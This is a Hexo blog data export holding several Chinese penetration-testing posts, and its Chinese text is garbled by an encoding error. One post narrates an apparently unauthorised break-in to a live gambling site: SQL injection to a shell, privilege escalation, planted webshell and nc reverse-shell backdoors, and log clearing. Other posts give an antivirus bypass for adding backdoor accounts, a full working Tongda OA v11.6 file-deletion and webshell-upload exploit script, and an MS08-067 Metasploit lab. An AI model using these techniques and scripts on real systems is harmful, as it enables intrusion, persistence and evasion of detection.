{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"æŸåšå½©ç½‘ç«™æ¸—é€å®æˆ˜","slug":"æŸåšå½©ç½‘ç«™æ¸—é€å®æˆ˜","date":"2020-09-24T04:00:00.000Z","updated":"2020-09-25T06:07:03.668Z","comments":true,"path":"2020/09/24/æŸåšå½©ç½‘ç«™æ¸—é€å®æˆ˜/","link":"","permalink":"http://yoursite.com/2020/09/24/%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/","excerpt":"","text":"æœ¬æ–‡åŸåˆ›é¦–å‘æŠ•ç¨¿åœ¨åˆå¤©æ™ºæ±‡ï¼Œä»…é™äºæŠ€æœ¯è®¨è®ºä¸åˆ†äº«ï¼Œä¸¥ç¦ç”¨äºéæ³•é€”å¾„ã€‚è‹¥è¯»è€…å› æ­¤ä½œå‡ºä»»ä½•å±å®³ç½‘ç»œå®‰å…¨è¡Œä¸ºåæœè‡ªè´Ÿã€‚ å‰è¨€æœ€è¿‘å¬è¯´ç”¨æŸæ£‹ç‰Œäº§å“å»ºçš„ç«™å­˜åœ¨SQLæ³¨å…¥ï¼Œåˆšå¥½åˆ«äººå‘æ¥ä¸€ä¸ª æ¸—é€æƒ¯ç”¨å¥—è·¯ä¸€æŠŠæ¢­ä¿¡æ¯æ”¶é›† -&gt; æ¼æ´æ¢æµ‹/åˆ©ç”¨ -&gt; ææƒ/æƒé™ç»´æŒ -&gt; æ¸…ç†ç—•è¿¹ ä¸€ã€ä¿¡æ¯æ”¶é›† æµè§ˆå™¨è®¿é—®ä¸»é¡µåˆæ­¥å‘ç°ç³»ç»Ÿï¼šWindows serverä¸­é—´ä»¶ IIS7.5è¯­è¨€ï¼šASPX ç«¯å£æ‰«æ1nmap -sV -T4 -p- 11x.xx.xxx.xx å¼€æ”¾çš„ç«¯å£çœŸä¸å°‘å…¶ä¸­webæœåŠ¡çš„æœ‰å‡ ä¸ªï¼š80(å½“å‰ä¸»é¡µ)ã€81ã€82ã€88ã€4700181ï¼šæ˜¯è¿™ä¸ªæ£‹ç‰Œç«™çš„åå°82ï¼šä¹Ÿæ˜¯ä¸ªåå°ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆç³»ç»Ÿçš„åå°ï¼Œæœ‰éªŒè¯ç 88/47001ï¼šè®¿é—®å¤±è´¥ 1433ï¼šæ•°æ®åº“ mssql è¿˜å¼€äº† 139ã€445 ä½†æ˜¯è¢«è¿‡æ»¤äº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æœ‰é˜²ç«å¢™ï¼Œåé¢å†çœ‹ æ•æ„Ÿç›®å½•æ‰«æå…ˆç”¨ Dirsearch è¿‡ä¸€éï¼Œå‰é¢æœé›†åˆ°ç½‘ç«™è¯­è¨€æ˜¯ aspxï¼ŒåŠ ä¸Š -e æŒ‡å®šè¯­è¨€ 1python dirsearch.py -u http:&#x2F;&#x2F;11x.xx.xxx.xx -e aspx å†ç”¨ 7kbscan è¿‡ä¸€éï¼Œæ¯•ç«Ÿè¿™é‡Œé¢æ”¶é›†çš„éƒ½æ˜¯å›½äººå¸¸ç”¨çš„å­—å…¸ /m/ æ˜¯ç”¨æˆ·æ³¨å†Œé¡µé¢ï¼Œå¯èƒ½æœ‰ç”¨ï¼Œå…ˆè®°ç€ /test.htmlæ˜¯è°ƒèµ·å¾®ä¿¡çš„å…¥å£ï¼Œæ²¡å•¥ç”¨ï¼Œå¯èƒ½æ˜¯åœ¨æ‰‹æœºç«¯å¼•å¯¼å—å®³è€…èŠå¤©çš„å§ æŸ¥IPåŒ—äº¬æŸä¸ªè¿è¥å•†çš„æœåŠ¡å™¨ï¼Œè èœåœ¨å›½å†…æœåŠ¡å™¨å»ºç«™æŒºå¤§èƒ†çš„ ä¿¡æ¯æ•´ç† ä¼°è®¡å°±æ˜¯ä¸ªäººå»ºçš„å°ç«™ï¼Œä¸å»å±•å¼€æ”¶é›†æ›´è¿‡çš„ä¸œè¥¿äº†ï¼Œå…å¾—æ‰“åæµªè´¹æ—¶é—´ äºŒã€æ¼æ´æ¢æµ‹é‡ç‚¹å…ˆæ”¾åœ¨å‰é¢æ‰¾åˆ°çš„ 81 ç«¯å£ï¼Œä¹Ÿå°±æ˜¯ç½‘ç«™çš„åå°ç®¡ç†é¡µé¢ æ²¡æœ‰éªŒè¯ç ï¼Œç”¨æˆ·å / å¯†ç éšä¾¿å†™ä¸ª admin / adminï¼ŒæŠ“åŒ… ç”¨æˆ·ååŠ äº†ä¸ªå¼•å·å‘é€è¯·æ±‚ç›´æ¥è¿”å›æŠ¥é”™äº†ï¼Œä¸å‡ºæ„å¤–åº”è¯¥ä¼šæœ‰æŠ¥é”™æ³¨å…¥æˆ–è€…ç›²æ³¨å•¥çš„ å…µåˆ†ä¸¤è·¯ä¸€è·¯æŠŠè¿™ä¸ªæ•°æ®åŒ…ä¿å­˜åˆ°æœ¬åœ° qipai.txtï¼Œç”¨ sqlmap å»æ‰«ï¼Œå‰é¢å·²ç»çŸ¥é“æ˜¯ mssql æ•°æ®åº“ï¼ŒåŠ ä¸Š â€“dbms å‚æ•°æŒ‡å®šæ•°æ®åº“ç±»å‹èŠ‚çº¦æ—¶é—´ 1python sqlmap.py -r qipai.txt --dbms &quot;Microsoft SQL Server&quot; --dbs å¦ä¸€è·¯ï¼ŒæŠŠæ•°æ®åŒ…å‘é€åˆ° intruder æ¨¡å—å»çˆ†ç ´å¯†ç ï¼Œå°è¯•äº†åœ¨æµè§ˆå™¨éšä¾¿è¾“å…¥ç”¨æˆ·åï¼Œæç¤º â€œç”¨æˆ·åä¸å­˜åœ¨â€ï¼Œè¾“å…¥ admin çš„æ—¶å€™æç¤º â€œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€ï¼Œè¯´æ˜ admin è´¦æˆ·æ˜¯å­˜åœ¨çš„ï¼Œåªçˆ†ç ´å¯†ç å°±è¡Œ çˆ†å‡ºå¯†ç  888999ï¼Œå¼±å£ä»¤ï¼Œæ°¸è¿œæ»´ç¥ï¼ğŸ˜ æˆåŠŸç™»å½•åå° åªæœ‰ 69 ä¸ªæ³¨å†Œç”¨æˆ·ï¼Œå‰©ä¸‹çš„å…¨æ˜¯æœºå™¨äººï¼Œè¿™ 69 ä¸ªç”¨æˆ·å†²äº† 143 ä¸‡ï¼Ÿç©æ£‹ç‰Œçš„éƒ½è¿™ä¹ˆæœ‰é’±å—ï¼Œæˆ‘æ¬¢ä¹æ–—åœ°ä¸»éƒ½èˆä¸å¾—å†² 6 å—é¦–å……ğŸ˜¥ èµŒåšæ²¾ä¸å¾—å‘€ï¼Œè¿™ä¸ªè€å“¥ä¸€å¤©è¾“äº† 2800ï¼Œæ‰€æœ‰çš„è¾“èµ¢ç‡ç®¡ç†å‘˜éƒ½å¯ä»¥åœ¨åå°éšæ„é…ç½® åœ¨åå°ç¿»äº†åŠå¤©æ²¡æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå…ˆæ”¾ç€ å›åˆ°å¦ä¸€è·¯ sqlmap çœ‹çœ‹ï¼Œç¡®å®šå­˜åœ¨æ³¨å…¥ï¼Œå·²ç»åœ¨æ…¢æ…¢è·‘åº“åäº† è·‘å‡º 16 ä¸ªåº“ï¼Œæ ¹æ®åå­—çŒœ RYPlatformManagerDB åº“å¯èƒ½å­˜ç€ç®¡ç†å‘˜çš„ç›¸å…³ä¿¡æ¯ è·‘è¡¨å 1python sqlmap.py -r qipai.txt --tables -D RYPlatformManagerDB ç¿»äº†åŠå¤©å°±æ‰¾åˆ°ä¸€ä¸ªç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œå°±æ˜¯å‰é¢ bp çˆ†ç ´å‡ºæ¥çš„é‚£ä¸ªï¼Œè¿˜æœ‰ä¸€äº›ç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ²¡å•¥æ›´æœ‰ä»·å€¼çš„ 1python sqlmap.py -r qipai.txt --is-dba æ˜¯ DBA æƒé™ï¼Œå°è¯•æ‹¿ shellï¼Œmssql æ•°æ®åº“ç›´æ¥ç”¨ sqlmap çˆ†ç ´è·¯å¾„å°±è¡Œäº† 1python sqlmap.py -r qipai.txt --os-shell ç”¨çš„ç›²æ³¨ï¼Œæ—¶é—´è¾ƒæ…¢ï¼Œç»è¿‡æ¼«é•¿çš„ç­‰å¾…ç»ˆäºæˆåŠŸæ‹¿ shellï¼Œæ¸—é€å‘ï¼Œè¡¨é¢ä¸Šæ˜¯ä¸ªæŠ€æœ¯æ´»ï¼Œå®é™…ä¸Šæ˜¯ä¸ªä½“åŠ›æ´»ğŸ¤” whoami æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™å¾ˆå°ï¼Œåªæ˜¯ä¸ª mssql æ•°æ®åº“æƒé™ Systeminfo æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ç³»ç»Ÿæ˜¯ 64 ä½çš„ Windows server 2008 Cobaltstrike ç”Ÿæˆæ”»å‡»è½½è·ï¼Œå†ç›®æ ‡æœºå™¨ä¸Šç”¨ powershell åŠ è½½ï¼Œç›®æ ‡æœºå™¨æˆåŠŸä¸Šçº¿ net user æŸ¥çœ‹ç”¨æˆ· tasklist æŸ¥çœ‹è¿›ç¨‹ï¼Œåº”è¯¥æ²¡æœ‰è£…æ€è½¯ net start æŸ¥çœ‹å·²å¼€å¯çš„æœåŠ¡ï¼Œå¯ä»¥çœ‹åˆ°é˜²ç«å¢™æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥å‰é¢ nmap æ‰«æ 445 ç­‰ç«¯å£è¢«è¿‡æ»¤ å…³é—­é˜²ç«å¢™ï¼Œé¢è¿˜æ²¡ææƒğŸ˜® ä¸‰ã€ææƒ/ç»´æƒå‰é¢å¾—çŸ¥è¿™ä¸ªæœºå™¨æ˜¯ windows server 2008ï¼Œå°è¯•ç”¨åœŸè±†ææƒï¼ˆMS16-075ï¼‰ æ‰§è¡Œåç¨ç­‰äº†ä¸€ä¼šå„¿ï¼Œæ¯”è¾ƒå¹¸è¿ï¼Œè¿™ä¸ªæœºå™¨æ²¡æ‰“è¡¥ä¸ï¼Œä¸€æ¬¡å°±ææƒæˆåŠŸï¼Œæ‹¿åˆ° system æƒé™ï¼Œå¼€å§‹ä¸ºæ‰€æ¬²ä¸ºğŸ˜Š è¿›å…¥æ–‡ä»¶ç®¡ç†ï¼Œèƒ½çœ‹åˆ°å‰é¢ä¿¡æ¯æ”¶é›†æ—¶çš„ test.html æ–‡ä»¶ netstat -ano çœ‹ä¸€ä¸‹ç«¯å£å¼€æ”¾æƒ…å†µï¼Œ3389 æ²¡æœ‰å¼€ æ‰‹åŠ¨å¼€å¯ä¸€ä¸‹ 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f å¯ä»¥è®¿é—®è¿œç¨‹æ¡Œé¢äº† cobaltstrike æ“ä½œä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œè¿˜æ˜¯ç”¨ metasploite å§ï¼Œé€šè¿‡ cs ä¸Šä¼ ä¸€ä¸ª msf ç”Ÿæˆçš„é©¬ï¼Œmsf å¼€å¯ç›‘å¬ æ³¨ï¼šcs å¯ä»¥ç›´æ¥æ´¾ç”Ÿ shell ç»™ msfï¼Œä½†æ˜¯å½“æ—¶æˆ‘å°è¯•çš„è€åŠå¤© msf ä¸€ç›´æ²¡æœ‰è¿”å› sessionï¼Œæ‰€ä»¥æ‰æ— å¥ˆå…ˆæ‰‹åŠ¨ä¸Šä¼ ä¸€ä¸ª msf çš„é©¬æ›²çº¿æ•‘å›½ msf å¼€å¯ç›‘å¬ åœ¨ cs ä¸Šè¿è¡Œä¸Šä¼ çš„é©¬ msf æˆåŠŸæ‹¿åˆ° shellï¼Œæ˜¯ç»§æ‰¿çš„ system æƒé™ æŸ¥çœ‹å¯†ç å“ˆå¸Œï¼Œä¸èƒ½è·å–ï¼Œå› ä¸ºmsfçš„è¿™ä¸ªé©¬æ˜¯32ä½çš„ï¼Œç³»ç»Ÿæ˜¯64ä½çš„ ps æŸ¥çœ‹è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹ä¸­æ‰¾ä¸€ä¸ªä»¥ system æƒé™è¿è¡Œçš„ 64 ä½çš„ç¨‹åºï¼Œè¿ç§»è¿›ç¨‹åå†è·å–å“ˆå¸Œ åˆ°åœ¨çº¿ç ´è§£å“ˆå¸Œçš„ç½‘ç«™æŸ¥ä¸€ä¸‹ administrator çš„å¯†ç ï¼Œå¯†ç ä¸ç®—å¤æ‚ï¼Œå‡ ç§’é’Ÿå°±æŸ¥åˆ°äº† æˆåŠŸç™»å½•è¿œç¨‹æ¡Œé¢ï¼Œæ‹¿ä¸‹è¿™ä¸ªåšå½©ç½‘ç«™çš„æœåŠ¡å™¨ ç•™ä¸¤ä¸ªåé—¨ï¼Œä¸€ä¸ªwebshellï¼Œä¸€ä¸ªå¼€æœºè‡ªå¯çš„ncç”¨æ¥åå¼¹shell å››ã€æ¸…ç†ç—•è¿¹ï¼Œæ’¤é€€meterpreter çš„ clearv å‘½ä»¤ä¸€é”®æ¸…é™¤ æˆ–è€…æ‰‹åŠ¨åˆ é™¤ Windows æ—¥å¿— æ€»ç»“ æ‰€ä»¥èµŒåšè¿™ä¸œè¥¿ç¢°éƒ½ä¸è¦ç¢°ï¼Œçœ‹éƒ½ä¸è¦çœ‹ï¼Œä¸€ç‚¹å¥½å¥‡å¿ƒéƒ½ä¸è¦æœ‰ï¼Œè¿™äº›éª—å­å‰²éŸ­èœæ¼”éƒ½ä¸å¸¦æ¼”çš„ï¼Œå°±çº¯å‰²ï¼Œç¡¬å‰²ã€‚","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"net user è¢«æ€è½¯æ‹¦æˆªç»•è¿‡æ–¹å¼","slug":"net user è¢«æ€è½¯æ‹¦æˆªç»•è¿‡æ–¹å¼","date":"2020-09-13T04:00:00.000Z","updated":"2020-09-12T16:34:49.419Z","comments":true,"path":"2020/09/13/net user è¢«æ€è½¯æ‹¦æˆªç»•è¿‡æ–¹å¼/","link":"","permalink":"http://yoursite.com/2020/09/13/net%20user%20%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/","excerpt":"","text":"æ‹¿ä¸‹ç›®æ ‡æœºå™¨ååšæƒé™ç»´æŒï¼Œæ·»åŠ åé—¨ç”¨æˆ·çš„æ—¶å€™ç»å¸¸ä¼šè¢«ç«ç»’ç­‰æ€è½¯æ‹¦æˆªï¼Œå¯ä»¥ä½¿ç”¨å¤åˆ¶ net1 çš„æ–¹å¼ç»•è¿‡ C:\\Windows\\System32 ç›®å½•ä¸‹æœ‰ net.exe å’Œ net1.exe æ–‡ä»¶ï¼Œä»–ä¿©æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥æ·»åŠ ç”¨æˆ·ä¼šè¢«æ‹¦æˆª æŠŠ net1.exe ä¼ªè£…æˆ txt æ–‡ä»¶ 12cd C:\\Windows\\System32copy net1.exe xxx.txt ç”¨ xxx.txt ä»£æ›¿ net å‘½ä»¤æ¥æ·»åŠ ç”¨æˆ·ï¼Œä¸å†æ‹¦æˆª 123net user test1 passwd /add (ä¼šè¢«æ‹¦æˆª)net1 user test1 passwd /add ï¼ˆä¼šè¢«æ‹¦æˆªï¼‰xxx.txt user test1 passwd /add ï¼ˆä¸ä¼šæ‹¦æˆªï¼‰ æ³¨ï¼šè¯•äº†ä¸‹ 360ã€å®‰å…¨ç‹— ä¸è¡Œï¼Œè¿™ä¿©è¿˜æ˜¯ä¼šæ‹¦æˆªï¼Œå…¶ä»–çš„æœªæµ‹è¯•","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"http://yoursite.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤+ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤+ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2020-08-20T04:00:00.000Z","updated":"2020-08-23T05:06:52.923Z","comments":true,"path":"2020/08/20/é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤+ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´/","link":"","permalink":"http://yoursite.com/2020/08/20/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4+%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"é€šè¾¾OA v11.6 ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ é™¤ auth.inc.php æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯æ ¡éªŒç”¨æˆ·èº«ä»½çš„ï¼Œåˆ é™¤åç”¨æˆ·æƒé™éªŒè¯ç­‰åŠŸèƒ½å°±ä¼šå¤±æ•ˆï¼Œç„¶åé…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼  webshell æ‹¿ä¸‹æœåŠ¡å™¨æƒé™ ç¯å¢ƒå‡†å¤‡ ä¸‹æ–‡çš„å¤ç° EXP ä¼šåˆ é™¤æœåŠ¡å™¨çš„ auth.inc.php æ–‡ä»¶å¯¹ç³»ç»Ÿé€ æˆç ´åï¼Œä¸€å®šåœ¨æœ¬æœºæ­å»ºç¯å¢ƒå¤ç° é€šè¾¾OA 11.6 å®‰è£…åŒ…ï¼Œä¸‹è½½å®ŒæŒ‰ç…§æç¤ºä¸€æ­¥æ­¥å®‰è£…å³å¯å¤©ç¿¼äº‘: https://cloud.189.cn/t/u2eYvm6zIbEr è®¿é—®ç : ht4b æ­å»ºå®Œæˆè®¿é—®é»˜è®¤åœ°å€å¦‚ä¸‹ http://127.0.0.1:80 getshellEXP 123456789101112131415161718192021222324252627import requeststarget=\"http://127.0.0.1:80/\"payload=\"&lt;?php eval($_REQUEST['a']);?&gt;\"print(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\")input(\"Press enter to continue\")print(\"[*]Deleting auth.inc.php....\")url=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\"requests.get(url=url)print(\"[*]Checking if file deleted...\")url=target+\"/inc/auth.inc.php\"page=requests.get(url=url).textif 'No input file specified.' not in page: print(\"[-]Failed to deleted auth.inc.php\") exit(-1)print(\"[+]Successfully deleted auth.inc.php!\")print(\"[*]Uploading payload...\")url=target+\"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./\"files = &#123;'FILE1': ('hack.php', payload)&#125;requests.post(url=url,files=files)url=target+\"/_hack.php\"page=requests.get(url=url).textif 'No input file specified.' not in page: print(\"[+]Filed Uploaded Successfully\") print(\"[+]URL:\",url)else: print(\"[-]Failed to upload file\") æ‰§è¡Œå‘½ä»¤ 1python tongda.py æ‰§è¡Œå®Œæ¯•åè¿”å›ä¸Šä¼ çš„ webshell è·¯å¾„ æŸ¥çœ‹æœåŠ¡å®‰è£…è·¯å¾„ï¼Œwebshell åœ¨ webroot æ ¹ç›®å½• èšå‰‘è¿æ¥ ä¿®å¤æ–¹æ³• å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ v11.7 åˆ é™¤è¿™ä¸ªæ–‡ä»¶ /module/appbuilder/assets/print.phpï¼Œä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´å°±æ˜¯å®ƒå¯¼è‡´çš„ å‚è€ƒè¿æ¥ï¼šhttps://drivertom.blogspot.com/2020/08/oa116-preauth-rce-0day.html?m=1","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"windowsä¸»æœºæ¸—é€ - MS08-067","slug":"Windowsä¸»æœºæ¸—é€-MS08-067","date":"2020-07-03T04:00:00.000Z","updated":"2020-07-05T02:54:56.241Z","comments":true,"path":"2020/07/03/Windowsä¸»æœºæ¸—é€-MS08-067/","link":"","permalink":"http://yoursite.com/2020/07/03/Windows%E4%B8%BB%E6%9C%BA%E6%B8%97%E9%80%8F-MS08-067/","excerpt":"","text":"MS08-067æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€æ¯”è¾ƒç»å…¸çš„windowsæ¼æ´ï¼Œè¯¥æ¼æ´æ˜¯å‡ºç°åœ¨ 445 ç«¯å£çš„ SMB æœåŠ¡ä¸Šï¼Œå¯èƒ½å…è®¸è¿œç¨‹æ‰§è¡Œä»£ç ã€‚ åœ¨ Windows 2000ã€Windows XP å’Œ Windows Server 2003 ç³»ç»Ÿä¸Šï¼Œæ”»å‡»è€…å¯èƒ½æœªç»èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´è¿è¡Œä»»æ„ä»£ç ã€‚ ç¯å¢ƒå‡†å¤‡ç›®æ ‡æœºå™¨ï¼š10.1.1.130 (windows xp ç®€ä¸­ï¼Œé˜²ç«å¢™æœªå¼€å¯)æ”»å‡»æœºå™¨ï¼š10.1.1.128 (kali) nmap æ¢æµ‹ç›®æ ‡ä¸»æœºæ£€æŸ¥ç«¯å£å¼€æ”¾æƒ…å†µ1nmap -sV -T4 10.1.1.130 æ‰«æç»“æœå¯ä»¥çœ‹å‡ºï¼Œç›®æ ‡æœºå™¨å¼€å¯äº†445ç«¯å£ æ£€æŸ¥æ˜¯å¦å­˜åœ¨ SMB æ¼æ´1nmap --script&#x3D;smb-check-vulns 10.1.1.130 ä½¿ç”¨ nmap çš„ smb-check-vulns è„šæœ¬æ£€æŸ¥å‡ºç›®æ ‡æœºå™¨å­˜åœ¨å‡ ä¸ª SMB æœåŠ¡çš„æ¼æ´ï¼Œå…¶ä¸­åŒ…æ‹¬ MS08-067 æ£€æµ‹ä¸»æœºç³»ç»Ÿç‰ˆæœ¬1nmap -O 10.1.1.130 ä½¿ç”¨ nmap çš„ -O å‚æ•°æ£€æµ‹åˆ°ç›®æ ‡æœºå™¨çš„ç³»ç»Ÿæ˜¯ windows xp SP2 æˆ–è€… SP3 metasploit æ”»å‡»ç›®æ ‡ä¸»æœº1ã€kali ä¸Šå¯åŠ¨ metasploitï¼Œä½¿ç”¨å‘½ä»¤ search 08-067 æœç´¢ ms08-067 å¯ä»¥åˆ©ç”¨çš„æ¨¡å— æŸ¥è¯¢åˆ°ä¸€ä¸ªå¯åˆ©ç”¨çš„æ¨¡å— 2ã€è¾“å…¥å‘½ä»¤ use exploit/windows/smb/ms08_067_netapiï¼Œä½¿ç”¨è¿™ä¸ªæ¨¡å— 3ã€è¾“å…¥å‘½ä»¤ set payload windows/meterpreter/reverse_tcp ï¼Œè®¾ç½®ä¸€ä¸ªåå‘è¿æ¥çš„ payload 4ã€è¾“å…¥å‘½ä»¤ show options æŸ¥çœ‹éœ€è¦è®¾ç½®çš„é€‰é¡¹ æ ‡æ³¨ YES çš„æ˜¯éœ€è¦æ‰‹åŠ¨è®¾ç½®çš„é€‰é¡¹ï¼Œå…¶ä¸­æœ‰äº›æ˜¯å·²ç»é»˜è®¤è®¾ç½®äº†çš„ï¼Œè¿™é‡Œåªéœ€è¦è®¾ç½® RHOST å’Œ LHOST å³å¯ï¼ŒRHOST æ˜¯ç›®æ ‡æœºå™¨çš„ IPï¼ŒLHOST æ˜¯ kali æœºå™¨çš„IP 5ã€å‰é¢ nmap æ‰«æå¾—çŸ¥ç›®æ ‡æœºå™¨çš„ç‰ˆæœ¬æ˜¯ windows xp SP2 æˆ–è€… SP3ï¼Œå…ˆå°† target è®¾ç½®æˆ windows xp SP2 æµ‹è¯•ï¼Œå¯¹åº”çš„ id æ˜¯ 17ï¼Œè¾“å…¥å‘½ä»¤ set target 17ï¼Œç„¶å run å¼€å§‹æ”»å‡» æ”»å‡»å¤±è´¥ï¼Œæ²¡æœ‰è·å–åˆ° meterpreterï¼Œç›®æ ‡æœºå™¨çš„ç³»ç»Ÿåº”è¯¥ä¸æ˜¯ SP2ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œtarget è®¾ç½®é”™è¯¯æ”»å‡»å¤±è´¥åï¼Œç›®æ ‡æœºå™¨ä¼šæŠ¥å‡ºä¸‹å›¾çš„é”™è¯¯ï¼Œä¼šå¯¼è‡´ kali è¿ä¸ä¸Šç›®æ ‡æœºå™¨ï¼Œéœ€è¦é‡å¯ç›®æ ‡æœºå™¨å†è¿›è¡Œæµ‹è¯•ã€‚ è¾“å…¥å‘½ä»¤ show targets æŸ¥çœ‹å¯è®¾ç½®çš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œè¿™é‡Œ windows xp SP3 ç®€ä½“ä¸­æ–‡å¯¹åº”çš„ id æ˜¯ 41 é‡å¯ç›®æ ‡æœºå™¨åï¼Œtarget è®¾ç½®ä¸º 41ï¼Œé‡æ–°æ”»å‡»æˆåŠŸï¼Œè·å–åˆ° meterpreter 6ã€è¿œç¨‹ç™»é™†ç›®æ ‡æœºå™¨åœ¨ meterpreter ä¸‹è¾“å…¥ shell ï¼Œè¿›å…¥ shell äº¤äº’ç¯å¢ƒã€‚ç”±äºå‰é¢ nmap æ‰«æå‘ç°ç›®æ ‡æœºå™¨è¿˜å¼€å¯äº† 3389 è¿œç¨‹ç™»é™†ç«¯å£ï¼Œå°è¯•æ–°å¢è´¦å·æ¥ç™»é™†ã€‚ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ 12345678# æ–°å»ºä¸€ä¸ªç”¨æˆ·åæ˜¯ testï¼Œå¯†ç æ˜¯ test çš„ç”¨æˆ·net user test test &#x2F;add# å°†ç”¨æˆ· test æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„net localgroup Administrators test &#x2F;add# å°†ç”¨æˆ· test æ·»åŠ åˆ°å…è®¸è¿œç¨‹ç™»å½•çš„ç»„net localgroup &quot;Remote Desktop Users&quot; test &#x2F;add åœ¨ kali æœºå™¨ä¸Šæ–°å¼€ä¸€ä¸ª terminal çª—å£ï¼Œè¾“å…¥ç™»é™†è¿œç¨‹æ¡Œé¢çš„å‘½ä»¤ rdesktop 10.1.1.130 ä½¿ç”¨ä¸Šé¢æ–°å»ºçš„ test ç”¨æˆ·ç™»å½•æˆåŠŸ 7ã€å¦‚æœæ˜¯çœŸå®æ¸—é€é¡¹ç›®ï¼Œæµ‹è¯•å®Œæ¯•åè®°å¾—å°†åˆ›å»ºçš„ç”¨æˆ·åˆ é™¤ 12345678# å°†ç”¨æˆ· test ä»ç®¡ç†å‘˜ç»„åˆ é™¤net localgroup Administrators test &#x2F;del# å°†ç”¨æˆ· test ä»å…è®¸è¿œç¨‹ç™»å½•çš„ç»„åˆ é™¤net localgroup &quot;Remote Desktop Users&quot; test &#x2F;del# å°†ç”¨æˆ· test ä»ç³»ç»Ÿä¸­åˆ é™¤net user test &#x2F;del","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Pythonæ‰“é€ ç«¯å£æ‰«æå™¨(2) - TCP SYNæ‰«æ","slug":"Pythonæ‰“é€ ç«¯å£æ‰«æå™¨(2) - TCP SYNæ‰«æ","date":"2020-05-29T04:00:00.000Z","updated":"2020-05-29T11:40:03.276Z","comments":true,"path":"2020/05/29/Pythonæ‰“é€ ç«¯å£æ‰«æå™¨(2) - TCP SYNæ‰«æ/","link":"","permalink":"http://yoursite.com/2020/05/29/Python%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8(2)%20-%20TCP%20SYN%E6%89%AB%E6%8F%8F/","excerpt":"","text":"å†™åœ¨å‰é¢è¿™ç¯‡æ–‡ç« æ˜¯ python æ‰“é€ ç«¯å£æ‰«æå™¨çš„ç¬¬äºŒç¯‡ï¼Œä»‹ç» TCP 